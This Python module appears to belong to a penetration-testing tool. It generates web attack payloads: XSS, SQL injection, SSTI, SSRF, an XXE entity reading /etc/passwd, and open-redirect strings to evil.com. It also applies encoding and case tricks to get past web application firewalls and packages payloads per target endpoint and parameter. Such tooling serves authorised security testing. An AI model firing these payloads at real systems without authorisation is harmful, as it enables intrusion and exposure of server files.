"""
X19 Offensive Payloads — public payloads for testing, witness payloads, minimal proof.

Provides:
- Payload generation for vuln classes (XSS, SQLi, SSTI, SSRF, etc.)
- Encoding variations for bypass
- Context-aware payloads (HTML, attribute, JS, URL)
- Safety: witness payloads only, minimal proof, not destructive

All payloads are public knowledge, not private, no secrets.
"""

from __future__ import annotations

from typing import Dict, List, Optional, Any
import random
import urllib.parse
import html

from x19.knowledge import get_knowledge_base


class PayloadGenerator:
    """Generates payloads for testing, using knowledge base."""

    def __init__(self):
        self.kb = get_knowledge_base()

    def get_witness_payloads(self, vuln_class: str) -> List[str]:
        """Get witness payloads for vuln class — minimal proof, not destructive."""
        payloads_data = self.kb.get_payloads(vuln_class)
        if payloads_data:
            # Check if data has witness payloads
            if isinstance(payloads_data, dict):
                # Could be payloads dict with witness key
                if "witness" in payloads_data:
                    witness = payloads_data["witness"]
                    if isinstance(witness, list):
                        return witness
                    elif isinstance(witness, dict) and "payloads" in witness:
                        return witness["payloads"]
                # Could be vuln data with payloads containing witness
                if "payloads" in payloads_data:
                    inner = payloads_data["payloads"]
                    if isinstance(inner, dict) and "witness" in inner:
                        w = inner["witness"]
                        if isinstance(w, list):
                            return w
                        elif isinstance(w, dict) and "payloads" in w:
                            return w["payloads"]
                    elif isinstance(inner, list):
                        # List of payload categories
                        for cat in inner:
                            if isinstance(cat, dict) and cat.get("type") == "witness":
                                return cat.get("payloads", [])

        # Fallback to hardcoded witness payloads (public knowledge)
        fallback = {
            "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"],
            "sqli": ["'", "\"", "' OR '1'='1", "' OR 1=1 --"],
            "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>"],
            "ssrf": ["http://127.0.0.1", "http://localhost", "http://0.0.0.0"],
            "xxe": ["<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>", "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>"],
            "open_redirect": ["https://evil.com", "//evil.com", "https://evil.com%2f%2e%2e"],
            "idor": ["Change ID 123 to 124"],
            "bola": ["Change ID 123 to 124"],
        }

        return fallback.get(vuln_class.lower(), [f"test_{vuln_class}_payload"])

    def get_bypass_payloads(self, vuln_class: str) -> List[str]:
        """Get bypass payloads for vuln class."""
        payloads_data = self.kb.get_payloads(vuln_class)
        if payloads_data:
            if isinstance(payloads_data, dict):
                if "bypasses" in payloads_data:
                    return payloads_data["bypasses"] if isinstance(payloads_data["bypasses"], list) else []
                if "payloads" in payloads_data:
                    inner = payloads_data["payloads"]
                    if isinstance(inner, list):
                        bypasses = []
                        for cat in inner:
                            if isinstance(cat, dict) and "bypass" in cat.get("type", "").lower():
                                bypasses.extend(cat.get("payloads", []))
                        if bypasses:
                            return bypasses

        fallback_bypass = {
            "xss": ["<ScRiPt>alert(1)</ScRiPt>", "<img src=x onerror=alert(1)>", "%3Cscript%3Ealert(1)%3C/script%3E"],
            "sqli": ["' AND 1=1 --", "' AND 1=2 --", "'/**/OR/**/1=1--"],
            "ssrf": ["http://0.0.0.0", "http://127.1", "http://[::ffff:127.0.0.1]"],
        }

        return fallback_bypass.get(vuln_class.lower(), [])

    def get_context_payloads(self, vuln_class: str, context: str) -> List[str]:
        """Get context-aware payloads (html, attribute, javascript, url)."""
        payloads_data = self.kb.get_payloads(vuln_class)
        if payloads_data and isinstance(payloads_data, dict):
            # Check for context_specific
            if "context_specific" in payloads_data and context in payloads_data["context_specific"]:
                return [payloads_data["context_specific"][context]] if isinstance(payloads_data["context_specific"][context], str) else payloads_data["context_specific"][context]

            if "payloads" in payloads_data:
                inner = payloads_data["payloads"]
                if isinstance(inner, dict) and "context_specific" in inner and context in inner["context_specific"]:
                    val = inner["context_specific"][context]
                    return [val] if isinstance(val, str) else val
                if isinstance(inner, list):
                    for cat in inner:
                        if isinstance(cat, dict) and cat.get("type") == f"context_{context}":
                            return cat.get("payloads", [])

        # Fallback
        context_fallback = {
            "xss": {
                "html": ["<script>alert(1)</script>"],
                "attribute": ["\"><img src=x onerror=alert(1)>", "'><img src=x onerror=alert(1)>"],
                "javascript": ["';alert(1)//", "\";alert(1)//"],
                "url": ["javascript:alert(1)"],
            },
            "sqli": {
                "html": ["' OR '1'='1"],
                "attribute": ["' OR '1'='1"],
                "javascript": ["' OR '1'='1"],
                "url": ["' OR '1'='1"],
            },
        }

        return context_fallback.get(vuln_class.lower(), {}).get(context, self.get_witness_payloads(vuln_class))

    def encode_payload(self, payload: str, encoding: str) -> str:
        """Encode payload for bypass: url, html, base64, etc."""
        if encoding == "url":
            return urllib.parse.quote(payload)
        elif encoding == "html":
            return html.escape(payload)
        elif encoding == "double_url":
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding == "base64":
            import base64
            return base64.b64encode(payload.encode()).decode()
        elif encoding == "hex":
            return "".join(f"%{ord(c):02x}" for c in payload)
        elif encoding == "case_random":
            # Random case variation
            return "".join(c.upper() if random.choice([True, False]) else c.lower() for c in payload)
        else:
            return payload

    def generate_payloads_for_endpoint(self, vuln_class: str, endpoint: str, param: str, context: Optional[str] = None) -> List[Dict[str, Any]]:
        """Generate payloads for specific endpoint and param, with evidence collection guidance."""
        witness = self.get_witness_payloads(vuln_class)
        bypasses = self.get_bypass_payloads(vuln_class)

        all_payloads = []

        for payload in witness[:3]:  # Limit to 3 witness for safety
            all_payloads.append(
                {
                    "payload": payload,
                    "type": "witness",
                    "endpoint": endpoint,
                    "param": param,
                    "context": context or "unknown",
                    "encoding": "none",
                    "safety": "Witness payload, minimal proof, not destructive",
                    "evidence_required": f"Request to {endpoint} with {param}={payload}, response with payload unescaped or behavior change, tool output",
                }
            )

        for payload in bypasses[:2]:  # Limit bypasses
            all_payloads.append(
                {
                    "payload": payload,
                    "type": "bypass",
                    "endpoint": endpoint,
                    "param": param,
                    "context": context or "unknown",
                    "encoding": "none",
                    "safety": "Bypass payload, try if witness blocked by WAF",
                    "evidence_required": f"Request to {endpoint} with {param}={payload}, response with bypass success, tool output",
                }
            )

        # Add encoded variations
        for payload in witness[:1]:
            for encoding in ["url", "case_random"]:
                encoded = self.encode_payload(payload, encoding)
                if encoded != payload:
                    all_payloads.append(
                        {
                            "payload": encoded,
                            "type": f"witness_{encoding}",
                            "endpoint": endpoint,
                            "param": param,
                            "context": context or "unknown",
                            "encoding": encoding,
                            "safety": f"Witness with {encoding} encoding for bypass",
                            "evidence_required": f"Request with {encoding} encoded payload, response check",
                        }
                    )

        return all_payloads

    def get_all_payloads(self) -> Dict[str, List[str]]:
        """Get all payloads by vuln class."""
        vuln_classes = self.kb.list_vuln_classes()
        result = {}
        for vc in vuln_classes:
            result[vc] = self.get_witness_payloads(vc)

        return result
